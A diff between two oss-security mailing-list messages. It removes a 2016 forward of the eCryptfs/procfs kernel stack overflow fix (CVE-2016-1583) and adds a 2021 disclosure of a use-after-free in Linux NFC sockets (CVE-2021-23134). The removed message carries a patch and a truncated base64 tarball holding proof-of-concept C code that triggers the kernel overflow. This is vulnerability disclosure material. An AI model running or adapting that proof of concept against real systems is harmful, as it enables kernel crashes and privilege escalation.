@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["23072" "Friday" "10" "June" "2016" "14:46:23" "-0700" "John Johansen" "john.johansen@canonical.com" "<575B352F.9000808@canonical.com>" "499" "[oss-security] [vs-plain] Linux kernel stack overflow via ecryptfs and /proc/$pid/environ" nil nil nil "6" "2016061021:46:23" "[oss-security] [vs-plain] Linux kernel stack overflow via ecryptfs and /proc/$pid/environ" (number mark "U       john.johanse Jun 10  499/23072 " thread-indent "\"[oss-security] [vs-plain] Linux kernel stack overflow via ecryptfs and /proc/$pid/environ\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["7114" "Tuesday" "11" "May" "2021" "12:01:24" "+0300" "Nadav Markus" "nmarkus@paloaltonetworks.com" nil "180" "[oss-security] CVE-2021-23134: Linux kernel: UAF in nfc sockets" nil nil nil "5" nil nil (number mark "U       nmarkus@palo May 11  180/7114  " thread-indent "\"[oss-security] CVE-2021-23134: Linux kernel: UAF in nfc sockets\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-23134: Linux kernel: UAF in nfc sockets" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 20033 invoked by uid 550); 10 Jun 2016 21:46:39 -0000
+Received: (qmail 29919 invoked by uid 550); 11 May 2021 11:13:54 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,519 +12,239 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 20013 invoked from network); 10 Jun 2016 21:46:38 -0000
-From: John Johansen <john.johansen@canonical.com>
-Cc: Jann Horn <jannh@google.com>, Tyler Hicks <tyhicks@canonical.com>,
- "security@kernel.org" <security@kernel.org>
-To: oss-security@lists.openwall.com
-Organization: Canonical
-Message-ID: <575B352F.9000808@canonical.com>
-Date: Fri, 10 Jun 2016 14:46:23 -0700
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
- Thunderbird/38.8.0
+Received: (qmail 7981 invoked from network); 11 May 2021 09:01:50 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=paloaltonetworks.com;
+ h=mime-version : from : date : message-id : subject : to : cc :
+ content-type; s=PPS12012017;
+ bh=5CfeI6aM9MLzkOlqbybeGwLRLzdS3se1POxrJdUn7B4=;
+ b=VdEhmQ9EkuDWUzqlQKCI4hW/XSZbsl5PuY7auxoxesKsxZqWB4eBFs1cXilMN7dbZeQY
+ 6JMjs8Davjq0oVRwqweStN8jEWP+QLCxB7rdY7Nxg1rrUzgPHfXP+7RRSqRaSwa9914x
+ gjj+GZQhj/HyqvP6poL8rLfsHOxbRJNws3FVOVNJ5xBa/0nB04xEJgGDF3jqlj5opyCj
+ ppgu8xHeLGLCH5Q2tphAaAODFLpnVYFG7FqOtPJLSf0Doim7ncs2aRCUQ0TPnvhZVUom
+ Oe5YQym19mSkmzzqysjfDJlVgN8dTo1/s86sBg+lh6NTsOHIsO4CzBbecclt6azfP3/V Hg== 
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=paloaltonetworks-com.20150623.gappssmtp.com; s=20150623;
+        h=mime-version:from:date:message-id:subject:to:cc;
+        bh=5CfeI6aM9MLzkOlqbybeGwLRLzdS3se1POxrJdUn7B4=;
+        b=coTXTaDaPlYbVKEEFbU/BknyO5lrRHo4U577S57X3shPUcheCis7gl9IGEP9kb9T9C
+         c81pSBvf5i9gm68Jwd4W+IoksIzYa/uB1089mY90ZsrxxjECmbjIyjUJrekddzI/a4Sq
+         IaWy61JcLZndLSMaTOYS+YXmtnkL5ZTLEClgraLCDB8L9FXOA30FovVQoNyTTNFm7g0d
+         WVSAbAi5YB+s5q8MwTwjhlsi7FXaWVxePH4sOXhsofk/GzCFqAI5q2B1BZuiEcQKhCA6
+         0KSyJNvdA7eqJvJ6xbq6erApoMrKlPhQYx5RkbnkVKEC9OuJL50hGTcqgJbBAU/JHaJJ
+         KZMg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
+        bh=5CfeI6aM9MLzkOlqbybeGwLRLzdS3se1POxrJdUn7B4=;
+        b=F/iKNdPt0ZhE0IYVR2EzEuTMBFYn/XflfKuOPSfE0WarxyLupamCzeflMMLZdaOxHs
+         7JqtIwfNPcgzbP4RuSjIG42/MHqKhZ+EvYjp8MjUIRyZC5PI1HIjNJk80hZMU4TCU5cJ
+         SWYsZKR5gojbNSsa9pd9IPcpmvC4YP/qoJrEqChv0mVqGwksZ3Pgyw/g7OvIYgdt/sqw
+         ACckjRM5YxubiZigDo4hbl5MbWFGq8yFEjMcynkb0LEpLb4nA8VTP0mVkm+OX3bs0J6J
+         tHJDNKNB+GJul8tOFMFAu6Q+tWpvw+EiEK3eijSvWMDx/xsc1UjGti7n0UqiH9QZhVl7
+         jRwA==
+X-Gm-Message-State: AOAM533oa3fpBrkrXmL9Dspio6/qR3hoOjIluJVEXz1Cd6qXxzOBMKj2
+	C/km2ng08/2LDgBdbHCh0imAP6ERMg64+me8Wayrj6PkpKVzsejrMemdZ4R/SU5U2zhgPg56Hf1
+	T5I3a0k6VfOVLxsJX3YUzyvDcekIoeWMxzDj9bE8doD7r
+X-Received: by 2002:adf:e783:: with SMTP id n3mr36726366wrm.154.1620723695694;
+        Tue, 11 May 2021 02:01:35 -0700 (PDT)
+X-Google-Smtp-Source: ABdhPJy/iM/bPb78am7tN16pURy2Oz0x63dxHfXuysbjsyvENuLCz7Ns28JeidxFDzBUEDgMERMynM3twgBGOVhK10c=
+X-Received: by 2002:adf:e783:: with SMTP id n3mr36726340wrm.154.1620723695452;
+ Tue, 11 May 2021 02:01:35 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
- protocol="application/pgp-signature";
- boundary="oUFadpsSXmWEIrH4XXSl7BcG1sRDfWP35"
-Subject: [oss-security] [vs-plain] Linux kernel stack overflow via ecryptfs and
- /proc/$pid/environ
-
---oUFadpsSXmWEIrH4XXSl7BcG1sRDfWP35
-Content-Type: multipart/mixed; boundary="KurOk4gPSfS3NShJjJTnc2c6wP2p5h2uJ"
-From: John Johansen <john.johansen@canonical.com>
+From: Nadav Markus <nmarkus@paloaltonetworks.com>
+Date: Tue, 11 May 2021 12:01:24 +0300
+Message-ID: <CABV_C9NPJRadzFxP5rbV7GpP2wUSrNEE_Wpy6iC7Zx2UMyenfA@mail.gmail.com>
 To: oss-security@lists.openwall.com
-Cc: Jann Horn <jannh@google.com>, Tyler Hicks <tyhicks@canonical.com>,
- "security@kernel.org" <security@kernel.org>
-Message-ID: <575B352F.9000808@canonical.com>
-Subject: [vs-plain] Linux kernel stack overflow via ecryptfs and
- /proc/$pid/environ
+Cc: Or Cohen <orcohen@paloaltonetworks.com>
+Content-Type: text/plain; charset="UTF-8"
+X-Proofpoint-GUID: fNcv8F7XC4mzlJDC4O-nsuB0NknkmTiE
+X-Proofpoint-ORIG-GUID: fNcv8F7XC4mzlJDC4O-nsuB0NknkmTiE
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:6.0.391,18.0.761
+ definitions=2021-05-11_02:2021-05-10,2021-05-11 signatures=0
+X-Proofpoint-Spam-Details: rule=outbound_spam_notspam policy=outbound_spam score=0 malwarescore=0
+ bulkscore=0 suspectscore=0 spamscore=0 impostorscore=0 lowpriorityscore=0
+ phishscore=0 clxscore=1034 priorityscore=1501 mlxscore=0 mlxlogscore=999
+ adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.12.0-2104190000 definitions=main-2105110069
+Subject: [oss-security] CVE-2021-23134: Linux kernel: UAF in nfc sockets
 
---KurOk4gPSfS3NShJjJTnc2c6wP2p5h2uJ
-Content-Type: multipart/mixed;
- boundary="------------070000050502060506050409"
+Hello,
 
-This is a multi-part message in MIME format.
---------------070000050502060506050409
-Content-Type: text/plain; charset=windows-1252
-Content-Transfer-Encoding: quoted-printable
+This is an announcement about CVE-2021-23134. This is a vulnerability
+in the linux kernel that we found in the implementation of nfc sockets
+(in net/nfc/llcp_sock.c). This can lead to kernel privilege escalation
+from the context of an unprivileged user.
 
-This is a forward notification of a local priv escalation flaw from
-security@kernel.org to the OSS security list. The CRD was for
-2016-06-08 14:00:00 UTC. Patches attached to the email.
+The patch can be found here:
+https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=c61760e6940d
 
-The flaw in eCryptfs was assigned CVE-2016-1583.
+=*=*=*=*=*=*=*=*= VULNERABILITY DETAILS =*=*=*=*=*=*=*=*=
+All of the code figures are from kernel version 5.11.
 
-If backporting these patches to kernels pre 4.6 you may need to
-cherry-pick patch 6a480a7842545ec520a91730209ec0bae41694c1
+A recent bug fix to a refcount leak in llcp_sock_connect was issued to
+the linux kernel, with the following code changes (targeting an issue
+that was named CVE-2020-25670):
 
+ net/nfc/llcp_sock.c | 2 ++
+ 1 file changed, 2 insertions(+)
 
---------------070000050502060506050409
-Content-Type: text/plain; charset=UTF-8;
- name="2of3.patch"
-Content-Transfer-Encoding: quoted-printable
-Content-Disposition: attachment;
- filename="2of3.patch"
+diff --git a/net/nfc/llcp_sock.c b/net/nfc/llcp_sock.c
+index d257ed3b732a..68832ee4b9f8 100644
+--- a/net/nfc/llcp_sock.c
++++ b/net/nfc/llcp_sock.c
+@@ -108,11 +108,13 @@ static int llcp_sock_bind(struct socket *sock,
+struct sockaddr *addr, int alen)
+   llcp_sock->service_name_len,
+   GFP_KERNEL);
+  if (!llcp_sock->service_name) {
++ nfc_llcp_local_put(llcp_sock->local);
+  ret = -ENOMEM;
+  goto put_dev;
+  }
+  llcp_sock->ssap = nfc_llcp_get_sdp_ssap(local, llcp_sock);
+  if (llcp_sock->ssap == LLCP_SAP_MAX) {
++ nfc_llcp_local_put(llcp_sock->local);
+  kfree(llcp_sock->service_name);
+  llcp_sock->service_name = NULL;
+  ret = -EADDRINUSE;
+--
 
-From: Jann Horn <jannh@google.com>
-To: security@kernel.org
-Cc: Jann Horn <jannh@google.com>
-Subject: [PATCH 2/3] ecryptfs: forbid opening files without mmap handler
-Date: Wed,  1 Jun 2016 11:55:06 +0200
-Message-Id: <1464774907-7753-2-git-send-email-jannh@google.com>
-X-Mailer: git-send-email 2.8.0.rc3.226.g39d4020
-In-Reply-To: <1464774907-7753-1-git-send-email-jannh@google.com>
-References: <CAG48ez3HNCkbW0rFyQJqAvaLNxtLWTKMdPoo6TruYdkpE7oVvg@mail.gmail=
-.com>
- <1464774907-7753-1-git-send-email-jannh@google.com>
-X-Spam-Status: No, hits=3D-5.1 required=3D5 tests=3DDKIM_SIGNED,DKIM_VALID,=
-DKIM_VALID_AU,DKIM_VERIFIED
-X-Spam-Checker-Version: SpamAssassin 3.4.0-outflux_revision__1.66__
-X-Virus-Scanned: ClamAV using ClamSMTP
-Envelope-To: kees@outflux.net
-X-MIMEDefang-Filter: outflux$Revision: 1.316 $
-X-HELO: www.outflux.net
-X-Scanned-By: MIMEDefang 2.73
+The original patch notes says:
+```
+nfc_llcp_local_get() is invoked in llcp_sock_bind(),
+but nfc_llcp_local_put() is not invoked in subsequent failure branches.
+As a result, refcount leakage occurs.
+To fix it, add calling nfc_llcp_local_put().
+```
 
-This prevents users from triggering an exploitable stack overflow
-through a recursive invocation of pagefault handling that involves
-mapping procfs files into virtual memory.
+However, this fix causes a UAF under certain conditions. Specifically,
+there is another location where nfc_llcp_local_put is called with
+llcp_sock->local - the destructor of the socket:
 
-Signed-off-by: Jann Horn <jannh@google.com>
-Cc: stable@vger.kernel.org
----
- fs/ecryptfs/kthread.c | 13 +++++++++++--
- 1 file changed, 11 insertions(+), 2 deletions(-)
+void nfc_llcp_sock_free(struct nfc_llcp_sock *sock)
+{
+        kfree(sock->service_name);
 
-diff --git a/fs/ecryptfs/kthread.c b/fs/ecryptfs/kthread.c
-index 866bb18..e818f5a 100644
---- a/fs/ecryptfs/kthread.c
-+++ b/fs/ecryptfs/kthread.c
-@@ -25,6 +25,7 @@
- #include <linux/slab.h>
- #include <linux/wait.h>
- #include <linux/mount.h>
-+#include <linux/file.h>
- #include "ecryptfs_kernel.h"
-=20
- struct ecryptfs_open_req {
-@@ -147,7 +148,7 @@ int ecryptfs_privileged_open(struct file **lower_file,
- 	flags |=3D IS_RDONLY(d_inode(lower_dentry)) ? O_RDONLY : O_RDWR;
- 	(*lower_file) =3D dentry_open(&req.path, flags, cred);
- 	if (!IS_ERR(*lower_file))
--		goto out;
-+		goto have_file;
- 	if ((flags & O_ACCMODE) =3D=3D O_RDONLY) {
- 		rc =3D PTR_ERR((*lower_file));
- 		goto out;
-@@ -165,8 +166,16 @@ int ecryptfs_privileged_open(struct file **lower_file,
- 	mutex_unlock(&ecryptfs_kthread_ctl.mux);
- 	wake_up(&ecryptfs_kthread_ctl.wait);
- 	wait_for_completion(&req.done);
--	if (IS_ERR(*lower_file))
-+	if (IS_ERR(*lower_file)) {
- 		rc =3D PTR_ERR(*lower_file);
-+		goto out;
-+	}
-+have_file:
-+	if ((*lower_file)->f_op->mmap =3D=3D NULL) {
-+		fput(*lower_file);
-+		*lower_file =3D NULL;
-+		rc =3D -EMEDIUMTYPE;
-+	}
- out:
- 	return rc;
- }
---=20
-2.8.0.rc3.226.g39d4020
+        skb_queue_purge(&sock->tx_queue);
+        skb_queue_purge(&sock->tx_pending_queue);
 
+        list_del_init(&sock->accept_queue);
 
+        sock->parent = NULL;
 
---------------070000050502060506050409
-Content-Type: application/x-tar;
- name="crasher.tar"
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment;
- filename="crasher.tar"
+        nfc_llcp_local_put(sock->local);
+}
 
-Y3Jhc2hlci8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAADAwMDA3NTAAMTM0NTYwMQAwMDEzMjAyADAwMDAwMDAwMDAw
-ADEyNzIzMzY2NjA0ADAxMjAzMwAgNQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhciAgAGphbm5o
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbm9uY29uZgAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAABjcmFzaGVyL2NvbXBpbGUuc2gAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMDAwMDc1MAAxMzQ1NjAxADAw
-MTMyMDIAMDAwMDAwMDAxMDcAMTI3MjMzMzE2MTMAMDE0MDEwACAwAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAHVzdGFyICAAamFubmgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABu
-b25jb25mAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACMhL2Jpbi9iYXNo
-CmdjYyAtbyBjcmFzaGVyIGNyYXNoZXIuYyAtc3RkPWdudTk5IC1sZWNyeXB0
-ZnMgLVdhbGwgLWdnZGIKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAY3Jhc2hlci9jcmFzaGVyLmMAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAADAwMDA2NDAAMTM0NTYwMQAwMDEzMjAyADAwMDAw
-MDE1MDEzADEyNzIzMzMzNjA1ADAxMzYyMgAgMAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhciAg
-AGphbm5oAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbm9uY29uZgAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjZGVmaW5lIF9HTlVfU09VUkNFCiNp
-bmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+CiNp
-bmNsdWRlIDxmY250bC5oPgojaW5jbHVkZSA8ZXJyLmg+CiNpbmNsdWRlIDxz
-eXMvbW1hbi5oPgojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN5cy9w
-cmN0bC5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzdGRpbnQu
-aD4KI2luY2x1ZGUgPGtleXV0aWxzLmg+CiNpbmNsdWRlIDxlcnJuby5oPgoj
-aW5jbHVkZSA8ZWNyeXB0ZnMuaD4KI2luY2x1ZGUgPHN5cy9ldmVudGZkLmg+
-CiNpbmNsdWRlIDxzaWduYWwuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5j
-bHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzeXMvc3lzY2FsbC5oPgojaW5j
-bHVkZSA8c3lzL2lvY3RsLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNp
-bmNsdWRlIDxzdGRib29sLmg+CiNpbmNsdWRlIDxzY2hlZC5oPgoKdm9pZCBz
-ZXRfZW52X2FyZWEoY2hhciAqcHRyLCBzaXplX3Qgc2l6ZSkgewogIHN0cnVj
-dCBwcmN0bF9tbV9tYXAgbW1fbWFwID0gewogICAgLnN0YXJ0X2NvZGUgPSAw
-eDQwMDAwMCwKICAgIC5lbmRfY29kZSA9IDB4NDAwMDAxLAogICAgLnN0YXJ0
-X2RhdGEgPSAweDQwMDAwMiwKICAgIC5lbmRfZGF0YSA9IDB4NDAwMDAzLAog
-ICAgLnN0YXJ0X2JyayA9IDB4NDAwMDA0LAogICAgLmJyayA9ICh1aW50NjRf
-dClzYnJrKDApLAogICAgLnN0YXJ0X3N0YWNrID0gMHgxMDAwMDAwMDAsCiAg
-ICAuYXJnX3N0YXJ0ID0gMHgxMDAwMDAwMDIsCiAgICAuYXJnX2VuZCA9IDB4
-MTAwMDAwMDA0LAogICAgLmVudl9zdGFydCA9ICh1aW50NjRfdClwdHIsCiAg
-ICAuZW52X2VuZCA9ICh1aW50NjRfdClwdHIgKyBzaXplLAogICAgLmF1eHZf
-c2l6ZSA9IDAsCiAgICAuZXhlX2ZkID0gLTEKICB9OwogIGlmIChwcmN0bChQ
-Ul9TRVRfTU0sIFBSX1NFVF9NTV9NQVAsICZtbV9tYXAsIHNpemVvZihtbV9t
-YXApLCAwKSkKICAgIGVycigxLCAiUFJfU0VUX01NX01BUCIpOwp9Cgp2b2lk
-IHdyaXRlX2ZpbGUoY2hhciAqZGlyLCBjaGFyICpuYW1lLCBjaGFyICpkYXRh
-KSB7CiAgY2hhciBwYXRoWzUwMF07CiAgc3ByaW50ZihwYXRoLCAiJXMvJXMi
-LCBkaXIsIG5hbWUpOwogIGludCBmZCA9IG9wZW4ocGF0aCwgT19XUk9OTFl8
-T19UUlVOQ3xPX0NSRUFULCAwNjAwKTsKICBpZiAoZmQgPT0gLTEpCiAgICBl
-cnIoMSwgIm9wZW5pbmcgJXMgZmFpbGVkIiwgcGF0aCk7CiAgaWYgKHdyaXRl
-KGZkLCBkYXRhLCBzdHJsZW4oZGF0YSkpICE9IHN0cmxlbihkYXRhKSkKICAg
-IGVycngoMSwgIndyaXRlIHRvICVzIGZhaWxlZCIsIHBhdGgpOwogIGNsb3Nl
-KGZkKTsKfQoKc2l6ZV90IHJlYWRfZmlsZShjaGFyICpkaXIsIGNoYXIgKm5h
-bWUsIGNoYXIgKipkYXRhKSB7CiAgY2hhciBwYXRoWzUwMF07CiAgc3ByaW50
-ZihwYXRoLCAiJXMvJXMiLCBkaXIsIG5hbWUpOwogIGludCBmZCA9IG9wZW4o
-cGF0aCwgT19SRE9OTFkpOwogIGlmIChmZCA9PSAtMSkKICAgIGVycigxLCAi
-b3BlbiBcIiVzXCIiLCBwYXRoKTsKICBzdHJ1Y3Qgc3RhdCBzdDsKICBpZiAo
-ZnN0YXQoZmQsICZzdCkpCiAgICBlcnIoMSwgImZzdGF0Iik7CiAgKmRhdGEg
-PSBtYWxsb2Moc3Quc3Rfc2l6ZSk7CiAgaWYgKCEqZGF0YSkKICAgIGVycigx
-LCAibWFsbG9jIik7CiAgaWYgKHJlYWQoZmQsICpkYXRhLCBzdC5zdF9zaXpl
-KSAhPSBzdC5zdF9zaXplKQogICAgZXJyeCgxLCAicmVhZF9maWxlIHJlYWQi
-KTsKICBjbG9zZShmZCk7CiAgcmV0dXJuIHN0LnN0X3NpemU7Cn0KCmNoYXIg
-Km1tYXBfZmlsZShjaGFyICpwYXRoLCBzaXplX3QgbGVuKSB7CiAgaW50IGZk
-ID0gb3BlbihwYXRoLCBPX1JET05MWSk7CiAgaWYgKGZkID09IC0xKQogICAg
-ZXJyKDEsICJvcGVuIFwiJXNcIiIsIHBhdGgpOwogIGVycm5vID0gMDsKICBj
-aGFyICpwdHIgPSBtbWFwKE5VTEwsIGxlbiwgUFJPVF9SRUFELCBNQVBfUFJJ
-VkFURSwgZmQsIDApOwogIGlmIChwdHIgPT0gTUFQX0ZBSUxFRCkKICAgIGVy
-cigxLCAibW1hcCIpOwogIGNsb3NlKGZkKTsKICByZXR1cm4gcHRyOwp9Cgp2
-b2lkIGNvcHlfZmlsZShjaGFyICpzcmNkaXIsIGNoYXIgKnNyY25hbWUsIGNo
-YXIgKmRzdGRpciwgY2hhciAqZHN0bmFtZSkgewogIGNoYXIgY21kWzEwMDBd
-OwogIHNwcmludGYoY21kLCAiY3AgJyVzLyVzJyAnJXMvJXMnIiwgc3JjZGly
-LCBzcmNuYW1lLCBkc3RkaXIsIGRzdG5hbWUpOwogIGlmIChzeXN0ZW0oY21k
-KSkKICAgIGVycngoMSwgInN5c3RlbShcIiVzXCIpIiwgY21kKTsKfQoKdm9p
-ZCBldmVudGZkX3dhaXQoaW50IGZkKSB7CiAgdWludDY0X3QgY3RyOwogIHNz
-aXplX3QgcmVzID0gcmVhZChmZCwgJmN0ciwgOCk7CiAgaWYgKHJlcyAhPSA4
-KQogICAgZXJyKDEsICJldmVudGZkX3dhaXQiKTsKfQoKdm9pZCBldmVudGZk
-X3NlbmQoaW50IGZkKSB7CiAgdWludDY0X3QgY3RyID0gMTsKICBzc2l6ZV90
-IHJlcyA9IHdyaXRlKGZkLCAmY3RyLCA4KTsKICBpZiAocmVzICE9IDgpCiAg
-ICBlcnIoMSwgImV2ZW50ZmRfc2VuZCIpOwp9CgojZGVmaW5lIE1BVFJPU0tB
-X0RFUFRIIDUwCgpwaWRfdCBjaGlsZHJlbltNQVRST1NLQV9ERVBUSF07Cmlu
-dCBzeW5jX2V2ZW50ZmRzX3RvX2NoaWxkW01BVFJPU0tBX0RFUFRIXTsKaW50
-IHN5bmNfZXZlbnRmZHNfZnJvbV9jaGlsZFtNQVRST1NLQV9ERVBUSF07Cgpp
-bnQgbWFpbih2b2lkKSB7CiAgLy8gZmlyc3QsIHNldCB1cCBhbiBlY3J5cHRm
-cyBmb3IgbWF0cm9za2EgY3JlYXRpb24KICBjaGFyIHNpZ1tFQ1JZUFRGU19T
-SUdfU0laRV9IRVggKyAxXTsKICBjaGFyIHNhbHRbRUNSWVBURlNfU0FMVF9T
-SVpFXSA9IHswfTsKICBpZiAoZWNyeXB0ZnNfYWRkX3Bhc3NwaHJhc2Vfa2V5
-X3RvX2tleXJpbmcoc2lnLCAiZm9vYmFyIiwgc2FsdCkgPCAwKQogICAgZXJy
-eCgxLCAidW5hYmxlIHRvIGFkZCBrZXkgdG8ga2V5cmluZyIpOwogIGNoYXIg
-ZWNyeXB0ZnNfZGlyWzMwMF07CiAgc3ByaW50ZihlY3J5cHRmc19kaXIsICIl
-cy8uZWNyeXB0ZnMiLCBnZXRlbnYoIkhPTUUiKSk7CiAgaWYgKG1rZGlyKGVj
-cnlwdGZzX2RpciwgMDcwMCkgJiYgZXJybm8gIT0gRUVYSVNUKQogICAgZXJy
-KDEsICJta2RpciIpOwogIC8qIHNpbmdsZSBsaW5lOyBubyBmaWxlbmFtZSBl
-bmNyeXB0aW9uIGtleSAqLwogIHdyaXRlX2ZpbGUoZWNyeXB0ZnNfZGlyLCAi
-ZXhwbG9pdC5zaWciLCBzaWcpOwogIGlmIChta2RpcigiL3RtcC9leHBsb2l0
-X21vdW50IiwgMDcwMCkgJiYgZXJybm8gIT0gRUVYSVNUKQogICAgZXJyKDEs
-ICJta2RpciBpbiAvdG1wIik7CiAgaWYgKG1rZGlyKCIvdG1wL2V4cGxvaXRf
-bG93ZXIiLCAwNzAwKSAmJiBlcnJubyAhPSBFRVhJU1QpCiAgICBlcnIoMSwg
-Im1rZGlyIGluIC90bXAiKTsKICBjaGFyIGNvbmZfZGF0YVs1MDBdOwogIHNw
-cmludGYoY29uZl9kYXRhLCAiL3RtcC9leHBsb2l0X2xvd2VyIC90bXAvZXhw
-bG9pdF9tb3VudCBlY3J5cHRmcyBub25lIDAgMFxuIik7CiAgd3JpdGVfZmls
-ZShlY3J5cHRmc19kaXIsICJleHBsb2l0LmNvbmYiLCBjb25mX2RhdGEpOwog
-IGlmIChzeXN0ZW0oIi9zYmluL21vdW50LmVjcnlwdGZzX3ByaXZhdGUgZXhw
-bG9pdCIpKQogICAgZXJyeCgxLCAibW91bnQxIGZhaWxlZCIpOwoKICAvLyBu
-b3csIGNyZWF0ZSB0aGUgbWF0cm9za2FzCiAgY2hhciBNQVRST1NLQV9aRVJP
-WzUwICogMTAyNF07IC8qIDUwS2lCLCBzaG91bGQgYmUgc3VmZmljaWVudCB0
-byBwcmV2ZW50IGNhY2hpbmcgKi8KICBtZW1zZXQoTUFUUk9TS0FfWkVSTywg
-MHg0Miwgc2l6ZW9mKE1BVFJPU0tBX1pFUk8pKTsKICB3cml0ZV9maWxlKCIv
